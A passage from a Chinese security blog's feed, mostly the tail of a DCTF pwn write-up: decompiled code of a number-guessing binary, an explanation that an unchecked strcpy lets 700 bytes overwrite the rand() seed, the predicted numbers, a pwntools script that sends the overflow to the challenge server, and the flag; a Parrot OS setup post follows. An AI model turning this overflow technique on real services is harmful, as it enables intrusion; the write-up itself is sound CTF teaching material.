rax@7</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v15; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v16; <span class="comment">// rax@9</span></span><br><span class="line">  __int64 v17; <span class="comment">// rax@9</span></span><br><span class="line">  __int64 v18; <span class="comment">// rax@9</span></span><br><span class="line">  __int64 v19; <span class="comment">// rax@10</span></span><br><span class="line">  __int64 v20; <span class="comment">// rax@10</span></span><br><span class="line">  __int64 v21; <span class="comment">// rax@11</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v22; <span class="comment">// ebx@11</span></span><br><span class="line">  __int64 v23; <span class="comment">// rax@13</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [sp+0h] [bp-540h]@12</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [sp+210h] [bp-330h]@12</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [sp+240h] [bp-300h]@7</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [sp+260h] [bp-2E0h]@7</span></span><br><span class="line">  <span class="keyword">char</span> v29; <span class="comment">// [sp+2D0h] [bp-270h]@7</span></span><br><span class="line">  <span class="keyword">char</span> v30; <span class="comment">// [sp+2F0h] [bp-250h]@1</span></span><br><span class="line">  __int64 v31; <span class="comment">// [sp+3F0h] [bp-150h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [sp+4F8h] [bp-48h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [sp+514h] [bp-2Ch]@9</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [sp+518h] [bp-28h]@9</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v35; <span class="comment">// [sp+51Ch] [bp-24h]@7</span></span><br><span class="line">  __int64 v36; <span class="comment">// [sp+520h] [bp-20h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+52Ch] [bp-14h]@7</span></span><br><span class="line"> </span><br><span class="line">  *(_QWORD *)seed = <span class="number">0L</span>L;</span><br><span class="line">  v36 = <span class="number">8L</span>L;</span><br><span class="line">  v3 = sub_1972(<span class="number">8L</span>L, <span class="number">4L</span>L, a3);</span><br><span class="line">  <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::basic_ifstream(&amp;v30, <span class="string">"/dev/urandom"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::basic_ios&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>(&amp;v31) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = seed;</span><br><span class="line">    <span class="built_in">std</span>::istream::read((<span class="built_in">std</span>::istream *)&amp;v30, (<span class="keyword">char</span> *)seed, v36);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::basic_ios&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>(&amp;v31) )</span><br><span class="line">    &#123;</span><br><span class="line">      srand(seed[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v5) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cerr</span>, <span class="string">"Failed to read from /dev/urandom"</span>);</span><br><span class="line">      v4 = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;;</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::close(&amp;v30, v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v6) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cerr</span>, <span class="string">"Failed to open /dev/urandom"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  v35 = rand();</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v29);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v27);</span><br><span class="line">  LODWORD(v7) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Hello, there!"</span>);</span><br><span class="line">  LODWORD(v8) = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  LODWORD(v9) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"What is your name?"</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::getline&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v27);</span><br><span class="line">  LODWORD(v10) = <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::c_str(&amp;v27);</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;dest, v10);</span><br><span class="line">  srand(v35);</span><br><span class="line">  LODWORD(v11) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"I am glad to know you, "</span>);</span><br><span class="line">  LODWORD(v12) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v11, &amp;dest);</span><br><span class="line">  LODWORD(v13) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v12, <span class="string">"!"</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v13, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  LODWORD(v14) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</span><br><span class="line">                   &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">                   <span class="string">"If you guess the next 100 random numbers I shall give you the flag!"</span>);</span><br><span class="line">  LODWORD(v15) = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v14, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v15, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v34 = rand();</span><br><span class="line">    LODWORD(v16) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"What number am I thinking of? ["</span>);</span><br><span class="line">    LODWORD(v17) = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v16, i);</span><br><span class="line">    LODWORD(v18) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v17, <span class="string">"/100]"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v18, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::getline&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v27);</span><br><span class="line">    v33 = sub_1928(&amp;v27, <span class="number">0L</span>L, <span class="number">10L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v33 != v34 )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v21) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Wow that is wrong!"</span>);</span><br><span class="line">      <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v21, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      v22 = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    &#125;</span><br><span class="line">    LODWORD(v19) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Wow that is corect!"</span>);</span><br><span class="line">    LODWORD(v20) = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v19, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v26);</span><br><span class="line">  <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::basic_ifstream(&amp;v25, <span class="string">"./flag"</span>, <span class="number">8L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::is_open(&amp;v25) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::getline&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v25, &amp;v26);</span><br><span class="line">    LODWORD(v23) = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, &amp;v26);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v23, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::close(&amp;v25, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::~basic_ifstream(&amp;v25);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v26);</span><br><span class="line">LABEL_15:</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v27);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string(&amp;v29);</span><br><span class="line">  <span class="built_in">std</span>::basic_ifstream&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;::~basic_ifstream(&amp;v30);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v22;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>它首先从<a href="https://www.cnblogs.com/Flychown/p/6868520.html" target="_blank" rel="noopener">/dev/urandom</a>读取种子值并生成随机数。它将此随机数存储在v35中。之后，它使用<code>std :: getline（std :: cin，＆v27）</code>读取用户输入。由于它是一个<code>std :: string</code>，它首先调用<code>c_str（）</code>函数来获取C字符串指针并将该指针存储在<code>v10</code>中。最后，它调用<code>strcpy（＆dest，v10）</code>将我们的字符串复制到<code>dest</code>。好处是在这些操作期间没有长度检查，这意味着我们可以使用缓冲区溢出覆盖其他变量。</p><p>让我们继续我们的分析。</p><p>在读取输入并将其复制到<code>dest</code>后， 它会调用<code>srand（v35）</code>。因此，第一个随机生成的数字实际上是进一步使用的种子值。最后，它使用<code>rand（）</code>生成100个随机数，并期望我们正确猜测它们。</p><p>我们可以看到，从<code>dest</code>到<code>v35</code>的距离是700字节，<strong>这意味着在700个字符之后，接下来的4个字符将覆盖作为种子的<code>v35</code>中的值。由于我们可以根据需要设置种子值，因此我们可以猜测将生成的数字。</strong><br>(我们输入的是dest将覆盖v35)</p><p>既然我们可以控制种子，我们来试试将种子设置为<code>AAAA</code>,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> seed = <span class="number">0x41414141</span>;#AAAA</span><br><span class="line">srand(seed);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d "</span>, rand());</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>知识点:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import pwn</span><br><span class="line">&gt;&gt;&gt; pwn.p32(0x41414141)</span><br><span class="line">&apos;AAAA&apos;</span><br></pre></td></tr></table></figure></p><p>这样来输出一百个伪随机数字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2045728160,999757742,1103458615,457950600,1444241668,459281054,1543513065,1546750049,178068626,1337501091,1398490315,632882557,316733390,627129835,375653904,1151751726,132249441,1178832412,1784493309,36098333,1808153066,1840701539,495212499,111955712,1895620395,1941274903,495499453,177285689,7383240,596865193,1837829365,2053111400,1596622935,793804332,363578353,893380956,1253085387,1907091418,292647357,1431154013,1097108861,1691137672,2064036570,1413842252,170783860,292206826,418110330,303033301,1471039239,55119991,339131634,1131708657,1895821530,834344133,1243664369,1643958278,628135388,1739163822,1821243967,635518628,188545368,1511589684,541146381,1785168303,157910369,904724734,531065611,1410995756,664332504,823712968,694666121,1761441365,367366993,611219043,1027799969,538150853,903425870,1445910299,841184154,226981461,1501030291,1180315788,1358690118,1249368173,2014659921,454870840,745842803,495311661,46551014,419603122,1130830289,235096382,1931192807,1671976670,2020264686,2089103176,429217756,403846649,1352615284,1093550260</span><br></pre></td></tr></table></figure></p><p>wp.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">numbers = [<span class="number">2045728160</span>,<span class="number">999757742</span>,<span class="number">1103458615</span>,<span class="number">457950600</span>,<span class="number">1444241668</span>,<span class="number">459281054</span>,<span class="number">1543513065</span>,<span class="number">1546750049</span>,<span class="number">178068626</span>,<span class="number">1337501091</span>,<span class="number">1398490315</span>,<span class="number">632882557</span>,<span class="number">316733390</span>,<span class="number">627129835</span>,<span class="number">375653904</span>,<span class="number">1151751726</span>,<span class="number">132249441</span>,<span class="number">1178832412</span>,<span class="number">1784493309</span>,<span class="number">36098333</span>,<span class="number">1808153066</span>,<span class="number">1840701539</span>,<span class="number">495212499</span>,<span class="number">111955712</span>,<span class="number">1895620395</span>,<span class="number">1941274903</span>,<span class="number">495499453</span>,<span class="number">177285689</span>,<span class="number">7383240</span>,<span class="number">596865193</span>,<span class="number">1837829365</span>,<span class="number">2053111400</span>,<span class="number">1596622935</span>,<span class="number">793804332</span>,<span class="number">363578353</span>,<span class="number">893380956</span>,<span class="number">1253085387</span>,<span class="number">1907091418</span>,<span class="number">292647357</span>,<span class="number">1431154013</span>,<span class="number">1097108861</span>,<span class="number">1691137672</span>,<span class="number">2064036570</span>,<span class="number">1413842252</span>,<span class="number">170783860</span>,<span class="number">292206826</span>,<span class="number">418110330</span>,<span class="number">303033301</span>,<span class="number">1471039239</span>,<span class="number">55119991</span>,<span class="number">339131634</span>,<span class="number">1131708657</span>,<span class="number">1895821530</span>,<span class="number">834344133</span>,<span class="number">1243664369</span>,<span class="number">1643958278</span>,<span class="number">628135388</span>,<span class="number">1739163822</span>,<span class="number">1821243967</span>,<span class="number">635518628</span>,<span class="number">188545368</span>,<span class="number">1511589684</span>,<span class="number">541146381</span>,<span class="number">1785168303</span>,<span class="number">157910369</span>,<span class="number">904724734</span>,<span class="number">531065611</span>,<span class="number">1410995756</span>,<span class="number">664332504</span>,<span class="number">823712968</span>,<span class="number">694666121</span>,<span class="number">1761441365</span>,<span class="number">367366993</span>,<span class="number">611219043</span>,<span class="number">1027799969</span>,<span class="number">538150853</span>,<span class="number">903425870</span>,<span class="number">1445910299</span>,<span class="number">841184154</span>,<span class="number">226981461</span>,<span class="number">1501030291</span>,<span class="number">1180315788</span>,<span class="number">1358690118</span>,<span class="number">1249368173</span>,<span class="number">2014659921</span>,<span class="number">454870840</span>,<span class="number">745842803</span>,<span class="number">495311661</span>,<span class="number">46551014</span>,<span class="number">419603122</span>,<span class="number">1130830289</span>,<span class="number">235096382</span>,<span class="number">1931192807</span>,<span class="number">1671976670</span>,<span class="number">2020264686</span>,<span class="number">2089103176</span>,<span class="number">429217756</span>,<span class="number">403846649</span>,<span class="number">1352615284</span>,<span class="number">1093550260</span>]</span><br><span class="line"> <span class="comment">#刚才生成的数字</span></span><br><span class="line">r = remote(<span class="string">'167.99.143.206'</span>, <span class="number">65031</span>)</span><br><span class="line">r.recvlines(<span class="number">3</span>)</span><br><span class="line">r.sendline(<span class="string">'A'</span> * <span class="number">700</span> + p32(<span class="number">0x41414141</span>))<span class="comment">#保证和之前生成数字时的种子一致</span></span><br><span class="line">r.recvlines(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> number <span class="keyword">in</span> numbers:</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(str(number))</span><br><span class="line">    r.recvlines(<span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br></pre></td></tr></table></figure></p><p>这样我们及控制种子，１００个数字也输对了，flag就get到了<br><code>DCTF{8adadb46b599a58344559e009bc167da7f0e65e64167c27d3192e8b6df073eaa}</code><br>430111200008287946</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;XORnigma&quot;&gt;&lt;a href=&quot;#XORnigma&quot; class=&quot;headerlink&quot; title=&quot;XORnigma&quot;&gt;&lt;/a&gt;XORnigma&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>parrot安装</title>
    <link href="https://threst.github.io/2018/10/16/install/"/>
    <id>https://threst.github.io/2018/10/16/install/</id>
    <published>2018-10-16T05:32:13.000Z</published>
    <updated>2018-11-11T10:12:23.667Z</updated>
    
    <content type="html"><![CDATA[<h2 id="下载系统"><a href="#下载系统" class="headerlink" title="下载系统"></a>下载系统</h2><p>网站:<a href="https://www.parrotsec.org/download.php" target="_blank" rel="noopener">https://www.parrotsec.org/download.php</a></p><p>镜像制作:Etcher<br><a href="https://etcher.io/" target="_blank" rel="noopener">https://etcher.io/</a></p><p>支持3平台，很好用</p><h2 id="更新系统"><a href="#更新系统" class="headerlink" title="更新系统"></a>更新系统</h2><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><p><code>sudo vim /etc/apt/sources.list.d/parrot.list</code><br>添加清华源<br><code>deb http://mirrors.tuna.tsinghua.edu.cn/parrot/ parrot main contrib non-free</code></p><p>更新</p><p><code>apt-get update</code><br><code>apt-get dist-upgrade</code></p><h2 id="安装搜狗输入法"><a href="#安装搜狗输入法" class="headerlink" title="安装搜狗输入法"></a>安装搜狗输入法</h2><h3 id="安装fcitx"><a href="#安装fcitx" class="headerlink" title="安装fcitx"></a>安装fcitx</h3><p><code>sudo apt-get install fcitx</code></p><h3 id="安装fcitx-libs-qt"><a href="#安装fcitx-libs-qt" class="headerlink" title="安装fcitx-libs-qt"></a>安装fcitx-libs-qt</h3><p><code>sudo apt-get install fcitx-libs-qt</code></p><h3 id="下载对应版本deb"><a href="#下载对应版本deb" class="headerlink" title="下载对应版本deb"></a>下载对应版本deb</h3><p>去搜狗输入法官网<a href="http://pinyin.sogou.com/linux/" target="_blank" rel="noopener">http://pinyin.sogou.com/linux/</a> 下载自己系统对应版本的输入法安装包。</p><p><code>sudo apt-get -f install</code></p><p><code>sudo dpkg -i sogoupinyin_2.2.0.0108_amd64.deb</code></p><p>然后在fictx配置中中设置搜狗为第二个，这样首先的输入为英语，重启电脑</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;下载系统&quot;&gt;&lt;a href=&quot;#下载系统&quot; class=&quot;headerlink&quot; title=&quot;下载系统&quot;&gt;&lt;/a&gt;下载系统&lt;/h2&gt;&lt;p&gt;网站:&lt;a href=&quot;https://www.parrotsec.org/download.php&quot; target=&quot;_b
      
    
    </summary>
    
    
      <category term="系统" scheme="https://threst.github.io/tags/%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战wp</title>
    <link href="https://threst.github.io/2018/10/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
    <id>https://threst.github.io/2018/10/14/极客大挑战/</id>
    <published>2018-10-14T05:32:13.000Z</published>
    <updated>2018-11-11T10:10:57.639Z</updated>
    
